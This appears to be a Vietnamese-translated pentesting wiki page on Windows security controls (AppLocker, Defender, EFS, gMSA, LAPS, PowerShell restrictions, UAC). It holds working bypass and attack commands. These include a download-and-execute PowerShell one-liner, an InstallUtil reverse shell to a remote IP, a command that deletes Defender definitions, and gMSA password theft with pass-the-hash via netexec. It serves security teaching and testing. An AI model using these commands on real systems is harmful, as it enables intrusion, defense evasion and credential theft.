# Các biện pháp kiểm soát bảo mật Windows

{{#include ../../banners/hacktricks-training.md}}

## Chính sách AppLocker

Danh sách cho phép ứng dụng là danh sách các ứng dụng phần mềm hoặc tệp thực thi đã được phê duyệt, được phép hiện diện và chạy trên hệ thống. Mục tiêu là bảo vệ môi trường khỏi malware độc hại và phần mềm chưa được phê duyệt, không phù hợp với nhu cầu cụ thể của tổ chức.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) là **giải pháp đưa ứng dụng vào danh sách cho phép** của Microsoft, cho phép quản trị viên hệ thống kiểm soát **những ứng dụng và tệp nào người dùng có thể chạy**. Giải pháp này cung cấp **quyền kiểm soát chi tiết** đối với tệp thực thi, script, tệp cài đặt Windows, DLL, ứng dụng đóng gói và trình cài đặt ứng dụng đóng gói.\
Các tổ chức thường **chặn cmd.exe và PowerShell.exe** cũng như quyền ghi vào một số thư mục, **nhưng tất cả những hạn chế này đều có thể bị bypass**.

### Kiểm tra

Kiểm tra những tệp/phần mở rộng nào bị đưa vào danh sách đen/danh sách cho phép:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Đường dẫn registry này chứa các cấu hình và chính sách được AppLocker áp dụng, giúp xem lại tập hợp quy tắc hiện đang được thực thi trên hệ thống:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Các **thư mục có quyền ghi** hữu ích để bypass chính sách AppLocker: Nếu AppLocker cho phép thực thi bất kỳ thứ gì bên trong `C:\Windows\System32` hoặc `C:\Windows`, bạn có thể dùng các **thư mục có quyền ghi** để **bypass chính sách này**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Các binary [**"LOLBAS's"**](https://lolbas-project.github.io/) thường được **tin cậy** cũng có thể hữu ích để bypass AppLocker.
- **Các quy tắc viết kém cũng có thể bị bypass**
  - Ví dụ, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, bạn có thể tạo một **thư mục tên `allowed`** ở bất kỳ đâu và thư mục đó sẽ được cho phép.
  - Các tổ chức cũng thường tập trung vào việc **chặn executable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, nhưng lại quên mất **các vị trí khác** của [**PowerShell executable**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), chẳng hạn như `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` hoặc `PowerShell_ISE.exe`.
- **Hiếm khi bật thực thi DLL** vì việc này có thể làm tăng tải cho hệ thống và cần nhiều kiểm thử để đảm bảo không có gì bị lỗi. Vì vậy, dùng **DLL làm backdoor sẽ giúp bypass AppLocker**.
- Bạn có thể dùng [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) hoặc [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) để **thực thi** mã **Powershell** trong bất kỳ process nào và bypass AppLocker. Để biết thêm thông tin, xem: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Thông tin xác thực cục bộ nằm trong tệp này; các mật khẩu được lưu dưới dạng hash.

### Local Security Authority (LSA) - LSASS

**Thông tin xác thực** (dạng hash) được **lưu** trong **bộ nhớ** của subsystem này để hỗ trợ Single Sign-On.\
**LSA** quản lý **security policy** cục bộ (chính sách mật khẩu, quyền của người dùng...), **authentication**, **access token**...\
LSA sẽ **kiểm tra** thông tin xác thực được cung cấp trong tệp **SAM** (khi đăng nhập cục bộ) và **liên lạc** với **domain controller** để xác thực người dùng domain.

**Thông tin xác thực** được **lưu** trong **process LSASS**: vé Kerberos, hash NT và LM, mật khẩu có thể dễ dàng giải mã.

### LSA secrets

LSA có thể lưu một số thông tin xác thực trên đĩa:

- Mật khẩu của tài khoản máy tính trong Active Directory (domain controller không thể truy cập).
- Mật khẩu của các tài khoản Windows service
- Mật khẩu của các scheduled task
- Khác (mật khẩu của ứng dụng IIS...)

### NTDS.dit

Đây là cơ sở dữ liệu của Active Directory. Tệp này chỉ có trên Domain Controller.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) là phần mềm diệt virus có trong Windows 10, Windows 11 và các phiên bản Windows Server. Phần mềm này **chặn** các công cụ pentesting phổ biến như **`WinPEAS`**. Tuy nhiên, có những cách để **bypass các biện pháp bảo vệ này**.

### Check

Để kiểm tra **trạng thái** của **Defender**, bạn có thể chạy PS cmdlet **`Get-MpComputerStatus`** (kiểm tra giá trị **`RealTimeProtectionEnabled`** để biết tính năng này có đang hoạt động hay không):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bạn cũng có thể chạy lệnh sau để liệt kê thông tin:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS bảo vệ các file bằng mã hóa, sử dụng **khóa đối xứng** gọi là **File Encryption Key (FEK)**. Khóa này được mã hóa bằng **khóa công khai** của người dùng và lưu trong **alternative data stream** $EFS của file đã mã hóa. Khi cần giải mã, **khóa riêng tư** tương ứng trong chứng chỉ số của người dùng được dùng để giải mã FEK từ stream $EFS. Có thể tìm hiểu thêm [tại đây](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Các trường hợp giải mã không cần người dùng khởi tạo** gồm:

- Khi file hoặc thư mục được chuyển sang hệ thống file không hỗ trợ EFS, như [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), chúng sẽ tự động được giải mã.
- File đã mã hóa được gửi qua mạng bằng giao thức SMB/CIFS sẽ được giải mã trước khi truyền.

Phương thức mã hóa này cho phép chủ sở hữu **truy cập minh bạch** vào các file đã mã hóa. Tuy nhiên, chỉ đổi mật khẩu của chủ sở hữu rồi đăng nhập sẽ không cho phép giải mã.

**Điểm chính cần nhớ**:

- EFS sử dụng FEK đối xứng, được mã hóa bằng khóa công khai của người dùng.
- Việc giải mã sử dụng khóa riêng tư của người dùng để truy cập FEK.
- Tự động giải mã xảy ra trong một số điều kiện nhất định, chẳng hạn như sao chép sang FAT32 hoặc truyền qua mạng.
- Chủ sở hữu có thể truy cập các file đã mã hóa mà không cần thao tác bổ sung.

### Kiểm tra thông tin EFS

Kiểm tra xem **người dùng** có **sử dụng** **dịch vụ** này hay không bằng cách kiểm tra xem đường dẫn sau có tồn tại không:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kiểm tra **ai** có **quyền truy cập** vào file bằng lệnh cipher /c \<file>\
Bạn cũng có thể dùng `cipher /e` và `cipher /d` bên trong một thư mục để **mã hóa** và **giải mã** tất cả file

### Giải mã file EFS

#### Trở thành Authority System

Cách này yêu cầu **người dùng nạn nhân** phải đang **chạy** một **process** trên host. Nếu đúng vậy, bằng cách sử dụng một phiên `meterpreter`, bạn có thể mạo danh token của process thuộc người dùng (`impersonate_token` từ `incognito`). Hoặc bạn chỉ cần `migrate` sang process của người dùng.

#### Biết mật khẩu của người dùng

Mimikatz hướng dẫn cách nhập certificate/private key của người dùng và giải mã các file được bảo vệ bằng EFS khi biết mật khẩu.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft phát triển **Group Managed Service Accounts (gMSA)** để đơn giản hóa việc quản lý service account trong hạ tầng IT. Khác với các service account truyền thống thường bật cài đặt "**Password never expire**", gMSA cung cấp giải pháp an toàn và dễ quản lý hơn:

- **Tự động quản lý mật khẩu**: gMSA sử dụng mật khẩu phức tạp dài 240 ký tự, tự động thay đổi theo chính sách domain hoặc máy tính. Quá trình này do Key Distribution Service (KDC) của Microsoft xử lý, loại bỏ nhu cầu cập nhật mật khẩu thủ công.
- **Tăng cường bảo mật**: Những account này không bị khóa và không thể dùng để đăng nhập tương tác, qua đó tăng cường bảo mật.
- **Hỗ trợ nhiều host**: gMSA có thể được chia sẻ giữa nhiều host, phù hợp với các service chạy trên nhiều server.
- **Khả năng chạy Scheduled Task**: Không giống managed service account, gMSA hỗ trợ chạy scheduled task.
- **Đơn giản hóa việc quản lý SPN**: Hệ thống tự động cập nhật Service Principal Name (SPN) khi thông tin sAMaccount hoặc DNS name của máy tính thay đổi, giúp đơn giản hóa việc quản lý SPN.

Mật khẩu của gMSA được lưu trong thuộc tính LDAP _**msDS-ManagedPassword**_ và được Domain Controller (DC) tự động đặt lại mỗi 30 ngày. Mật khẩu này là một khối dữ liệu đã mã hóa, gọi là [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), chỉ quản trị viên được ủy quyền và các server đã cài đặt gMSA mới có thể truy xuất, giúp đảm bảo môi trường an toàn. Để truy cập thông tin này, cần có kết nối được bảo mật như LDAPS hoặc kết nối phải được xác thực bằng 'Sealing & Secure'.

![Relaying NTLM authentication to retrieve a gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

Bạn có thể đọc mật khẩu này bằng [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Tìm hiểu thêm trong nghiên cứu gốc đã lưu trữ**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Nghiên cứu tương tự giải thích cách **NTLM relay attack** có thể lấy được **mật khẩu gMSA** khi principal bị relay được cấp quyền đọc `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Lạm dụng ACL chaining để đọc mật khẩu được quản lý của gMSA (GenericAll -> ReadGMSAPassword)

Trong nhiều môi trường, người dùng có đặc quyền thấp có thể chuyển hướng sang các bí mật gMSA mà không cần xâm phạm DC bằng cách lạm dụng ACL của object bị cấu hình sai:<sup>[[3]](#references)</sup>

- Một group bạn có thể kiểm soát (ví dụ: thông qua GenericAll/GenericWrite) được cấp quyền `ReadGMSAPassword` đối với một gMSA.
- Bằng cách thêm chính mình vào group đó, bạn có quyền đọc blob `msDS-ManagedPassword` của gMSA qua LDAP và suy ra thông tin xác thực NTLM có thể sử dụng.

Quy trình thường dùng:

1) Dùng BloodHound để tìm đường đi và đánh dấu các principal foothold của bạn là Owned. Tìm các edge như:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Thêm chính mình vào group trung gian mà bạn kiểm soát (ví dụ bằng bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Đọc mật khẩu được quản lý của gMSA qua LDAP và suy ra hash NTLM. NetExec tự động trích xuất `msDS-ManagedPassword` và chuyển đổi thành NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Xác thực bằng tài khoản gMSA qua NTLM hash (không cần plaintext). Nếu tài khoản thuộc nhóm Remote Management Users, WinRM sẽ hoạt động trực tiếp:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Notes:
- Các truy vấn LDAP đối với `msDS-ManagedPassword` yêu cầu sealing (ví dụ: LDAPS/sign+seal). Các công cụ tự xử lý việc này.
- gMSA thường được cấp các quyền cục bộ như WinRM; hãy xác minh thành viên nhóm (ví dụ: Remote Management Users) để lập kế hoạch lateral movement.
- Nếu bạn chỉ cần blob để tự tính NTLM, hãy xem cấu trúc MSDS-MANAGEDPASSWORD_BLOB.

Một đường dẫn ACL khác là quyền ghi trên chính đối tượng gMSA. `msDS-GroupMSAMembership` là security descriptor dùng để xác định những principal nào có thể truy xuất mật khẩu được quản lý. GUID schema của thuộc tính này là `888eedd6-ce04-df40-b462-b8a50e41ba38`. Một ACE `WriteProperty` chính xác trên thuộc tính đó, áp dụng cho nhóm bạn kiểm soát, có thể là ứng viên để thay đổi danh sách bên được phép đọc; trường hợp này khác với việc nhóm đã có tên trong danh sách đọc. Hãy xác minh toàn bộ DACL, các ACE deny và inherited, cùng các quyền hiệu lực trước khi coi đường dẫn này là khả thi. Thành viên nhóm mới cũng cần token/session được làm mới trước khi thử đọc mật khẩu.<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)**, có thể tải xuống từ [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), cho phép quản lý mật khẩu Administrator cục bộ. Các mật khẩu này được **ngẫu nhiên hóa**, là duy nhất và được **thay đổi thường xuyên**, đồng thời được lưu trữ tập trung trong Active Directory. Quyền truy cập vào những mật khẩu này được giới hạn thông qua ACL, chỉ dành cho người dùng được ủy quyền. Khi được cấp đủ quyền, bạn có thể đọc mật khẩu admin cục bộ.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **hạn chế nhiều tính năng** cần thiết để sử dụng PowerShell hiệu quả, chẳng hạn như chặn COM objects, chỉ cho phép các kiểu .NET được phê duyệt, workflows dựa trên XAML, PowerShell classes, v.v.

### **Kiểm tra**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Trên các phiên bản Windows hiện tại, cách bypass đó không còn hoạt động, nhưng bạn có thể dùng [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Để biên dịch, bạn có thể cần** **phải** _**Thêm tham chiếu**_ -> _Duyệt_ ->_Duyệt_ -> thêm `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` và **chuyển project sang .Net4.5**.

#### Bypass trực tiếp:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Bạn có thể dùng [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) hoặc [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) để **thực thi** code Powershell trong bất kỳ process nào và bypass chế độ constrained. Để biết thêm thông tin, xem: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Chính sách thực thi PS

Theo mặc định, chính sách này được đặt thành **restricted.** Các cách chính để bypass chính sách này:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Có thể tìm thêm [tại đây](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

Đây là API có thể dùng để xác thực người dùng.

SSPI chọn giao thức xác thực phù hợp cho hai máy đang giao tiếp, ưu tiên Kerberos khi khả dụng. Các giao thức này được triển khai bởi Security Support Provider (SSP), được cài đặt dưới dạng DLL trên Windows; cả hai máy đều phải hỗ trợ provider được thương lượng.

### Main SSPs

- **Kerberos**: Được ưu tiên
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** và **NTLMv2**: Vì lý do tương thích
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Dùng cho máy chủ web và LDAP, mật khẩu ở dạng MD5 hash
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL và TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Được dùng để thương lượng giao thức sẽ sử dụng (Kerberos hoặc NTLM, trong đó Kerberos là mặc định)
  - %windir%\Windows\System32\lsasrv.dll

#### Quá trình thương lượng có thể đưa ra nhiều phương thức hoặc chỉ một phương thức.

<a id="uac"></a>

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) là một tính năng cho phép **hiển thị lời nhắc xác nhận khi thực hiện các hoạt động cần quyền nâng cao**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Chuyển tiếp cho gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA thông qua chuỗi quyền để truy cập WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Vượt qua AppLocker và PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 cách vượt qua PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [Cách giải mã tệp EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - thuộc tính ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
